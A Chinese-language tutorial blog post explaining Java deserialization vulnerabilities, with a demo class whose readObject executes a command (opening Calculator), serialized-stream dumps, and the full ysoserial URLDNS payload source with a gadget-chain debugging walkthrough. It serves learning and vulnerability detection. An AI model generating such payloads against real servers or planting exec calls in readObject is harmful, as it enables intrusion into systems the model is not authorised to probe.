---
title: 如何理解Java反序列化
description: 和传统SQL注入、XSS这些Web漏洞不同的是，不管是开发还是安全人员都没办法一下理解反序列化漏洞，而它又往往能造成RCE漏洞，这里学习一下它
categories:
 - 漏洞分析
tags:
 - 漏洞分析
---


### 0x00 反序列化漏洞简介
说实话，反序列化漏洞是我学漏洞的一道坎，大学里做过开发，学SQL注入这种漏洞原理的时候一下子就明白了，学XXE的时候搞半天也大概明白了，反序列化真的是一道坎，看了很多文章、很多资料还是不清不楚的感觉

看多了，最近好像有些开窍了，写文章记录一下

#### 序列化与反序列化
首先要知道序列化与反序列化的用途

我们在网络、文件中存储的数据是二进制或者是string类型的弱类型数据，它是没有类型区别的

我们在web后台等程序中使用的数据是编程语言的数据类型，也就是强类型的，当我们读取文件或者网络包中弱类型的数据，会进行一次弱类型到强类型的转换

一般来讲，上面的转会会自动转换成编程语言自带的类型，也就是基本string或者byte，但是为了灵活性，我们很多时候定义一个类，期望可以直接从string把数据变成类的属性

为了达到上面这种需求，就出现了序列化和反序列化，将类以一定的规定的格式表现在string或者byte中，写入到网络或者文件，读取的时候以一定格式解析出来

这种要求在各种语言中的实现是不同的，这里只说Java

比如，我们首先定义一个可以反序列化的Java类，readObject和writeObject是序列化和反序列化过程中会调用到的方法

```
package ysoserial.test;

import java.io.IOException;
import java.io.Serializable;

public class Person implements Serializable {
    public String name;

    private void readObject(java.io.ObjectInputStream in)throws IOException,ClassNotFoundException
    {
        in.defaultReadObject();
        Runtime.getRuntime().exec("open /System/Applications/Calculator.app");
    }

    private void writeObject(java.io.ObjectOutputStream out) throws IOException {
        out.defaultWriteObject();
        out.writeObject("test1234");
    }

}
```

然后将它写入到文件中

```
package ysoserial.test;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class Test {

    public static void main(String[] args) throws IOException {
        Person person = new Person();
        person.name = "milkfr";

        FileOutputStream fileOutputStream = new FileOutputStream("test.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(person);
        objectOutputStream.close();
        fileOutputStream.close();
    }
}
```

可以使用[SerializationDumper](https://github.com/NickstaDB/SerializationDumper)来分析文件的格式

`java -jar SerializationDumper.jar -r test.txt`

可以看到如下内容

```
STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      className
        Length - 21 - 0x00 15
        Value - ysoserial.test.Person - 0x79736f73657269616c2e746573742e506572736f6e
      serialVersionUID - 0xa1 de a1 e3 0e 75 ed b4
      newHandle 0x00 7e 00 00
      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE
      fieldCount - 1 - 0x00 01
      Fields
        0:
          Object - L - 0x4c
          fieldName
            Length - 4 - 0x00 04
            Value - name - 0x6e616d65
          className1
            TC_STRING - 0x74
              newHandle 0x00 7e 00 01
              Length - 18 - 0x00 12
              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
      classAnnotations
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_NULL - 0x70
    newHandle 0x00 7e 00 02
    classdata
      ysoserial.test.Person
        values
          name
            (object)
              TC_STRING - 0x74
                newHandle 0x00 7e 00 03
                Length - 6 - 0x00 06
                Value - milkfr - 0x6d696c6b6672
        objectAnnotation
          TC_STRING - 0x74
            newHandle 0x00 7e 00 04
            Length - 16 - 0x00 10
            Value - This is a object - 0x546869732069732061206f626a656374
          TC_ENDBLOCKDATA - 0x78

# milkfr @ mac in ~/ysoserial on git:master x [10:03:41] 
$ java -jar ~/SerializationDumper/SerializationDumper.jar -r test.txt

STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      className
        Length - 21 - 0x00 15
        Value - ysoserial.test.Person - 0x79736f73657269616c2e746573742e506572736f6e
      serialVersionUID - 0xa1 de a1 e3 0e 75 ed b4
      newHandle 0x00 7e 00 00
      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE
      fieldCount - 1 - 0x00 01
      Fields
        0:
          Object - L - 0x4c
          fieldName
            Length - 4 - 0x00 04
            Value - name - 0x6e616d65
          className1
            TC_STRING - 0x74
              newHandle 0x00 7e 00 01
              Length - 18 - 0x00 12
              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
      classAnnotations
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_NULL - 0x70
    newHandle 0x00 7e 00 02
    classdata
      ysoserial.test.Person
        values
          name
            (object)
              TC_STRING - 0x74
                newHandle 0x00 7e 00 03
                Length - 6 - 0x00 06
                Value - milkfr - 0x6d696c6b6672
        objectAnnotation
          TC_STRING - 0x74
            newHandle 0x00 7e 00 04
            Length - 8 - 0x00 08
            Value - test1234 - 0x7465737431323334
          TC_ENDBLOCKDATA - 0x78
```

可以看到，常见的aced是这个格式的开始标识，我们在反序列化类的定义的writeObject中增加的`out.writeObject("test1234");`被放在了objectAnnotation中，可以看到它们的对应关系

我们再从文件中把类转到Java类型中

![0-1](https://milkfr.github.io/assets/images/posts/2018-11-31-analysis-java-deserialize/0-1.png)

可以看到readObject成功将文件中保存的内容转换到了Person类中，同时，将触发了readObject中的命令执行

这已经解释了序列化和反序列化的过程，同时也展示了一个反序列化漏洞

到这里为止，反序列化漏洞都非常好理解，但是这里有个以前我看文章非常不明白的问题，比如弹计算器这个操作，应该是定义类的应用开发者完成的，不是外部攻击者，攻击者是不可以控制的，哪个开发会专门写个这样的后门呢，没有这样子的后门该如何利用呢

实际上在一般的公司里确实没有，我们公司gitlab上拉了80G的代码，扫描以后有只有三个项目的代码里写了readObject，但是他们是用组合模式封装了一下，实际上相当于没重写，就是一个有80G代码量的公司没有用到过这个

但是一些Java类库或者第三方库会用到，但是这些类库又比较复杂，比较难懂，一些文章在之后会介绍CommonsCollections的过程分析说明，我也能照着Debug，但是其中调用到的函数都是不明白做什么用的，文章中也没有解释，一般就稀里糊涂的找到某个地方，然后好像完成说明，最后我还是没看懂，这也是反序列化漏洞学起来为什么难的原因

#### ysoserial与gadget
后来我遇到了ysoserial，其实很早遇到了，能用它生成payload，但是没看到它代码，据说Java反序列化漏洞正是这个工具出现以后有了方便的利用方式，才开始受到很多关注

![0-2](https://milkfr.github.io/assets/images/posts/2018-11-31-analysis-java-deserialize/0-2.png)

可以看到，ysoserial的一些payload中提供了Gadget chain

gadget这个词经常可以在jackson的CVE上看到，

gadget chains也叫做利用链，通常称为gadget，它是从触发位置到漏洞造成漏洞代码位置的整个调用链，比如我们上面的例子，就是`Person.readObject`这一个函数就是全部的gadget

### 0x01 分析简单的反序列化漏洞gadget
我们从ysoserial的payload中找到利用链最短的URLDNS，有些没有写利用链，其他都很长

```
Gadget Chain:
  HashMap.readObject()
    HashMap.putVal()
      HashMap.hash()
        URL.hashCode()
```

#### 环境搭建
ysoserial是一个相对比较健壮的项目，用IDEA打开，并且支持maven就会自动加载项目并下载依赖，之后就可以当成一个普通的Java项目来使用

#### 现象查看
我最开始用常规的方法想生成一个Payload，然后debug

```
$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "id" > test.txt
Error while generating or serializing payload
java.net.MalformedURLException: no protocol: id
	at java.base/java.net.URL.<init>(URL.java:644)
	at ysoserial.payloads.URLDNS.getObject(URLDNS.java:56)
	at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
```

竟然报错了，就先看一下URLDNS在ysorialse中的Payload实现，没看太懂，网上查了一下资料，原来是要放一个url，通过触发DNS查询判断是否存在漏洞

然后我们使用ysoserial生成payload，并且自己写一个序列化的代码测试

可以看到（实践中需要注意，DNS查询一次以后可能有缓存，多次使用更换子域名好一些）

![1-1](https://milkfr.github.io/assets/images/posts/2018-11-31-analysis-java-deserialize/1-1.png)

看到上面这个会不会很惊恐，因为自己写的测试代码没有做任何操作，只是普普通通readObject就造成了反序列化漏洞，解析了DNS？

实际上就是这样，虽然解析DNS不是什么大风险，但是什么都不做，只是单单调用readObject就造成了反序列化漏洞

#### gadget流程
我们debug来看，这里要注意，直接在readObject出打断点，IDE是不会自动step into的，必须找到gadgat chain，也就是Payload注释里的HashMap的readObject

我们一路step over到payload的提示的gadget的`URL.hashcode`函数

![1-2](https://milkfr.github.io/assets/images/posts/2018-11-31-analysis-java-deserialize/1-2.png)

这个时候还是不能发现什么问题，只是看到没有直接返回，而是进入了`handle.hashCode`，所以继续step in

![1-3](https://milkfr.github.io/assets/images/posts/2018-11-31-analysis-java-deserialize/1-3.png)

通过Debug到`handle.hashCode`和它调用的`getHostAddress`到了这里其实就比较清晰了，也看到了解析出IP地址，也就是触发了漏洞

#### 回头看payload

```
/*
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
@Dependencies()
@Authors({ Authors.GEBL })
public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {

                //Avoid DNS resolution during payload creation
                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

        /**
         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
         * using the serialized object.</p>
         *
         * <b>Potential false negative:</b>
         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
         * second resolution.</p>
         */
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}
```

payload的注释是很清晰的

首先继承了一个`URLStreamHandler`类，防止在序列化的过程发出DNS请求

然后初始化一个`java.net.URL`对象，作为key放在`java.util.HashMap`中

设置这个URL对象的hashCode为`-1`，结合我们上面的debug过程，hashCode会因此在反序列化的过程中重新计算，之后就触发了后面的DNS请求

### 0x02 回顾
Java序列化将一个对象中的属性按照某种特定的格式生成一段数据流，在反序列化的时候再按照这个格式将属性拿出来，赋值给新的对象

Java提供了`writeObject`允许开发者在序列化数据中插入一些自定义数据，进而能够在反序列化过程中使用`readObject`读取，进而更完整的还原一个对象

我们分析了一个URLDNS的gadget来学习Java反序列化漏洞，这个Gadget的流程是

```
Gadget Chain:
  HashMap.readObject()
    HashMap.putVal()
      HashMap.hash()
        URL.hashCode()
          URLStreamHandler.hashCode()
            getHostAddress
              InetAddress.getByName()
```

其实ysoserial中提示的是到`URL.hashCode`是gadget，我想是因为我们payload实际影响到的是`URL.hashCode`中对hash重新计算的判断，后面的DNS查询只是顺水推舟罢了

回顾这个Gadget，`readObject`是HashMap对象的，`hashCode`是URL对象的

可以看到整个Payload的核心是利用hashCode的重新计算hash的判断，虽然gadget流程很简单，但是也跨越几个类的组合也利用的很精巧

也就是说反序列化本身也是数据从弱类型转变到强类型过程中，通过对数据内容的构造，触发一些程序本身不期望发生计算流程

核心就是根据gadget的数据构造，也就是如何在还原Java对象的时候触发非预期的操作

问题的本质还是因为数据转换从弱类型到强类型的过程中，解析过程存在漏洞，过分信任来源数据，没有对可能发生的情况进行处理，导致漏洞产生
